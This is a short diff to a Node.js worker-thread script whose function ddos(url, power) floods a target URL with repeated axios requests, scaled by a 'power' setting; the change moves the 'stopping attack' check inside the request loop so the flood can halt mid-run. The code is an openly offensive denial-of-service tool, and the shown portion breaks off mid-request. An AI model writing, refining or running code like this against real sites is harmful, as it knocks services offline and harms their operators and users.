@@ -47,11 +47,6 @@ if (isMainThread) {
     return new Promise((res,rej)=>{setTimeout(res,ms)})
   }
   async function ddos(url,power) {
-    if (stop) {
-      stop = false;
-      console.log('stopping attack - thread id: '+workerID)
-      return
-    }
     if (power >= 100) {
       var times = 200
     }
@@ -66,6 +61,11 @@ if (isMainThread) {
     }
     for (let i=0;i<times;i++) {
     for (let i=0;i<power*5;i++) {
+	        if (stop) {
+      stop = false;
+      console.log('stopping attack - thread id: '+workerID)
+      return
+    }
       console.log(c.green+'Requesting'+c.reset)
       axios
 				.request({
